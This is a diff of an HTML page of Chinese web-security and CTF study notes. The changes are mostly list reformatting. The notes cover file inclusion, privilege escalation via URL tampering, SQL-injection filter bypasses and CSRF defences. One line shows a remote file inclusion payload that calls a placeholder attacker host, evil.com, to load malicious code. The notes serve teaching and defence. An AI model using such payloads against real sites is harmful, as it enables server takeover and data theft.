@@ -3330,11 +3330,9 @@
 </div>
 <div class="tabbed-block">
 <ul>
-<li>认证与鉴权：如何证明你是你<ul>
-<li>Authentication</li>
-<li>Authorization</li>
-</ul>
-</li>
+<li>认证与鉴权：如何证明你是你
+    - Authentication
+    - Authorization</li>
 <li>处理请求：用户需要做什么？将结果返回客户端</li>
 <li>服务器也可以有不同分工：前端后端、数据库……</li>
 <li>安全：用户不能获得不该获取的信息（比如<span><span class="heti-spacing"> </span>flag</span><heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，不能为所欲为（比如任意代码执行）</li>
@@ -3357,23 +3355,17 @@
 使用<code>ifconfig</code>查看本机ip地址</p>
 <h2 id="_2">后端：业务逻辑<a class="headerlink" href="#_2" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h2>
 <ul>
-<li>逻辑漏洞：验证不充分、想当然的写法、条件竞争、未发现的旁门左道……<ul>
-<li>程序员的傲慢可能会让他认为<code>a==1&amp;&amp;a==2</code> 一定是<span class="heti-skip"><span class="heti-spacing"> </span>false<span class="heti-spacing"> </span></span>但……</li>
-</ul>
-</li>
+<li>逻辑漏洞：验证不充分、想当然的写法、条件竞争、未发现的旁门左道……
+    - 程序员的傲慢可能会让他认为<code>a==1&amp;&amp;a==2</code> 一定是 false 但……</li>
 </ul>
 <p><img alt="Untitled" src="https://prod-files-secure.s3.us-west-2.amazonaws.com/158f919d-d6bc-4e6d-842d-7480f90ccecc/31d85cd7-3d28-45ce-a7ea-040e2b4003fd/Untitled.png"/></p>
 <ul>
-<li>任意文件读与任意代码执行<ul>
-<li>例如一个<span class="heti-skip"><span class="heti-spacing"> </span>Web<span class="heti-spacing"> </span></span>应用允许用户上传头像，但未对上传的文件进行严格的类型和内容检查。攻击者上传一个包含恶意代码的文件，并通过文件包含漏洞执行该代码，从而控制服务器。</li>
-<li><span>CTF<span class="heti-spacing"> </span></span>竞赛中，能读服务器上 <code>/flag</code> 则读，否则就暗示我们需要<span class="heti-skip"><span class="heti-spacing"> </span>RCE (<span class="heti-spacing"> </span></span>不然连<span class="heti-skip"><span class="heti-spacing"> </span>flag<span class="heti-spacing"> </span></span>在哪个文件都不知道<span><span class="heti-spacing"> </span>).</span></li>
-</ul>
-</li>
+<li>任意文件读与任意代码执行
+    - 例如一个Web应用允许用户上传头像，但未对上传的文件进行严格的类型和内容检查。攻击者上传一个包含恶意代码的文件，并通过文件包含漏洞执行该代码，从而控制服务器。
+    - CTF竞赛中，能读服务器上 <code>/flag</code> 则读，否则就暗示我们需要 RCE (不然连 flag 在哪个文件都不知道).</li>
 <li>文件包含：例如一个<span class="heti-skip"><span class="heti-spacing"> </span>Web<span class="heti-spacing"> </span></span>应用允许用户通过<span class="heti-skip"><span class="heti-spacing"> </span>URL<span class="heti-spacing"> </span></span>参数指定要包含的文件，如<code>index.php?page=about</code>。攻击者可以通过构造恶意<span><span class="heti-spacing"> </span>URL</span>，如<code>index.php?page=http://evil.com/malicious.php</code>，包含远程恶意文件，从而执行恶意代码。</li>
-<li>越权：例如一个<span class="heti-skip"><span class="heti-spacing"> </span>Web<span class="heti-spacing"> </span></span>应用允许用户查看自己的订单信息，但未正确验证用户的身份。攻击者可以通过篡改<span class="heti-skip"><span class="heti-spacing"> </span>URL<span class="heti-spacing"> </span></span>参数，如<code>order.php?id=123</code>，查看其他用户的订单信息。<ul>
-<li>永远不要相信用户的数据！前端代码也许永远不会访问其他用户的数据，但这不代表恶意攻击者就不会。</li>
-</ul>
-</li>
+<li>越权：例如一个<span class="heti-skip"><span class="heti-spacing"> </span>Web<span class="heti-spacing"> </span></span>应用允许用户查看自己的订单信息，但未正确验证用户的身份。攻击者可以通过篡改<span class="heti-skip"><span class="heti-spacing"> </span>URL<span class="heti-spacing"> </span></span>参数，如<code>order.php?id=123</code>，查看其他用户的订单信息。
+    - 永远不要相信用户的数据！前端代码也许永远不会访问其他用户的数据，但这不代表恶意攻击者就不会。</li>
 </ul>
 <h2 id="_3">前端：可视化和操作逻辑<a class="headerlink" href="#_3" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h2>
 <h2 id="request"><span>request<span class="heti-spacing"> </span></span>库的使用<a class="headerlink" href="#request" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h2>
@@ -3513,25 +3505,25 @@ or 找 True值
 <h3 id="sql_1"><span>SQL<span class="heti-spacing"> </span></span>注入的绕过<a class="headerlink" href="#sql_1" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h3>
 <p>常见防护方法：</p>
 <ul>
-<li>
-<p>直接拦截</p>
-</li>
-<li>
-<p>关键字替换</p>
-</li>
-<li>
-<p>编码转义</p>
-</li>
-<li>
-<p>参数化查询：不会把参数执行</p>
-</li>
+<li>直接拦截</li>
+</ul>
+<ul>
+<li>关键字替换</li>
+</ul>
+<ul>
+<li>编码转义</li>
+</ul>
+<ul>
+<li>参数化查询：不会把参数执行</li>
+</ul>
+<ol>
 <li>
 <p>关键字匹配<span class="heti-skip"><span class="heti-spacing"> </span>(<span class="heti-spacing"> </span></span>直接查找<span class="heti-skip"><span class="heti-spacing"> </span>/<span class="heti-spacing"> </span></span>正则<span><span class="heti-spacing"> </span>)</span></p>
 </li>
 <li>
 <p>语义匹配</p>
 </li>
-</ul>
+</ol>
 <p><strong>绕过方法</strong>
 - 针对关键字/正则匹配
 - 大小写
@@ -3630,10 +3622,12 @@ SQL注入的本质是构造一条产生有效信息输送的信息链！</p>
 <p>针对第二个条件，是我们从技术层面要重点防范的，可选的防范措施包括：</p>
 <ul>
 <li>语义一致性：良好的编程习惯，操作类请求，必须使用<code>POST</code>，<code>GET</code>只用于浏览类请求。</li>
-<li>阻止外域访问</li>
+<li>阻止外域访问<ol>
 <li>同源检测：服务器端通过请求的<span class="heti-skip"><span class="heti-spacing"> </span>Origin Header<span class="heti-spacing"> </span></span>和<span><span class="heti-spacing"> </span>Referer Header</span>，判断请求的来源。</li>
 <li><code>Samesite Cookie</code>：控制只有同域（子域）能访问<span><span class="heti-spacing"> </span>Cookie</span>。</li>
-<li>随机数一致性检测</li>
+</ol>
+</li>
+<li>随机数一致性检测<ol>
 <li><code>CSRF Token</code>：用户登录后，生成随机值<code>csrf_token</code>，用户提交的操作类（POST）请求中，提交的表单中携带<code>csrf_token</code>，服务器端判断<code>csrf_token</code>是否正确。</li>
 <li>双重<code>Cookie</code>验证：<span>Cookie<span class="heti-spacing"> </span></span>中保存<code>csrf_token</code>，用户提交表单中也携带<code>csrf_token</code>，服务器端判断两个值是否一致。
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"&lt;https://bank.com/transfer&gt;"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
@@ -3643,6 +3637,8 @@ SQL注入的本质是构造一条产生有效信息输送的信息链！</p>
     <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"转账"</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </code></pre></div></li>
+</ol>
+</li>
 </ul>
 <h2 id="ssrf"><span>SSRF |<span class="heti-spacing"> </span></span>服务器端请求伪造<a class="headerlink" href="#ssrf" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h2>
 <p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">谈一谈如何在<span class="heti-skip"><span class="heti-spacing"> </span>Python<span class="heti-spacing"> </span></span>开发中拒绝<span class="heti-skip"><span class="heti-spacing"> </span>SSRF<span class="heti-spacing"> </span></span>漏洞</a></p>
